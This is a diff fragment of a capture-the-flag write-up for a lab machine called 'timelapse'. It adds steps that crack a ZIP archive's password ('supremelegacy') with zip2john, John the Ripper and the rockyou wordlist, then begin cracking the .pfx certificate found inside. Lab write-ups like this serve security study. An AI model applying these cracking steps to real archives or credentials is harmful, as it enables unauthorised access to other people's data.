@@ -279,7 +279,32 @@ Host OS = Unix
 Version = 20
 Volume Index = 0
 ````
-ZipCrypto Deflate is vulnerable to known plaintext attack
+ZipCrypto Deflate is vulnerable to known plaintext attack but we can try first rockyou
+
+````
+$ zip2john winrm_backup.zip > ziphash
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+fopen: /usr/share/wordlists/rockyou.txt: No such file or directory
+root@kali:~/Desktop/htb/timelapse# john --wordlist=/root/rockyou.txt ziphash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2022-04-01 07:54) 1.075g/s 3729Kp/s 3729Kc/s 3729KC/s suprgirl..supreme99
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+````
+
+````
+$ pfx2john legacyy_dev_auth.pfx > hash_pfx
+
+$ john --wordlist=/root/rockyou.txt hash_pfx
+
+````
 
 
 ## User
